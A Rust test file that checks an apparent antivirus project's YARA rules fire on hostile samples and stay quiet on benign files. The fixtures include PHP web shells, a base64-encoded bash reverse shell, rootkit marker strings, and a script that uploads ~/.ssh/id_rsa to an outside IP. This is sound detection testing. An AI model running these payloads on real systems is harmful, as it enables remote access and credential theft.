//! The YARA rules shipped in rules/yara: they compile, each fires on its sample, and none fires on ordinary files.
#![allow(clippy::expect_used, clippy::unwrap_used)]
use std::path::Path;
use std::time::Duration;

use ai_antivirus_rules::scan::{Yara, EICAR};

fn shipped() -> Yara {
    let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/yara");
    Yara::load_dir(&dir, Duration::from_secs(5)).expect("shipped YARA rules compile")
}

fn hits(y: &Yara, data: &[u8]) -> Vec<String> {
    let mut v: Vec<String> = y
        .scan_bytes(data)
        .expect("scan")
        .into_iter()
        .map(|h| h.rule)
        .collect();
    v.sort();
    v
}

#[test]
fn each_rule_fires_on_its_sample() {
    let y = shipped();
    let elf = |s: &str| [b"\x7fELF\x02\x01\x01\0".as_slice(), s.as_bytes()].concat();
    let cases: &[(&[u8], &str)] = &[
        (EICAR, "eicar_test_file"),
        (b"<?php @eval(base64_decode($_POST['x'])); ?>", "php_webshell_eval_input"),
        (b"<?PHP system($_GET[\"cmd\"]);", "php_webshell_eval_input"),
        (
            b"#!/bin/sh\necho 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEgICAgICAgIA==' | base64 -d | bash\n",
            "encoded_payload_to_shell",
        ),
        (&elf("..diamorphine_secret..hacked_kill.."), "linux_lkm_rootkit_known"),
        (&elf("reptile_shell /reptile/reptile_cmd"), "linux_lkm_rootkit_known"),
        (
            b"#!/bin/sh\ntar czf /tmp/k.tgz ~/.ssh/id_rsa\ncurl -s -F f=@/tmp/k.tgz https://203.0.113.9/up\n",
            "ssh_key_stealer_script",
        ),
    ];
    for (data, want) in cases {
        assert!(
            hits(&y, data).iter().any(|h| h == want),
            "{want} did not fire on {:?}",
            String::from_utf8_lossy(data)
        );
    }
}

#[test]
fn ordinary_files_stay_quiet() {
    let y = shipped();
    let quiet: &[&[u8]] = &[
        b"<?php echo htmlspecialchars($_POST['name']); ?>",
        b"#!/bin/sh\necho hello | base64 -d\n",
        b"echo 'aGVsbG8=' | base64 -d > out.txt\n",
        b"ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519\ncat ~/.ssh/id_ed25519.pub\n",
        b"curl -fsSL https://archlinux.org/ -o /dev/null\n",
        b"\x7fELF\x02\x01\x01\0 readdir opendir printf",
        b"The diamorphine paper, chapter 3",
        b"Documentation: tar czf keys.tgz ~/.ssh/id_rsa and curl -F f=@keys.tgz https://host/ uploads it",
    ];
    // a scanner script quoting a web shell deep inside (nmap's http-waf-detect.nse does this)
    let nse = [
        b"-- probe list\n".repeat(60).as_slice(),
        b"local probe = '<?php eval($_GET[\\'x\\']);'",
    ]
    .concat();
    for data in quiet.iter().copied().chain([nse.as_slice()]) {
        assert!(
            hits(&y, data).is_empty(),
            "fired on {:?}: {:?}",
            String::from_utf8_lossy(data),
            hits(&y, data)
        );
    }
}

#[test]
fn shipped_binaries_on_this_machine_stay_quiet() {
    // a cheap false-positive check against real files: whatever of these exists must not match
    let y = shipped();
    for p in [
        "/usr/bin/bash",
        "/usr/bin/ls",
        "/usr/bin/ssh",
        "/usr/bin/curl",
        "/usr/bin/python3",
    ] {
        if let Ok(data) = std::fs::read(p) {
            assert!(hits(&y, &data).is_empty(), "{p}: {:?}", hits(&y, &data));
        }
    }
}
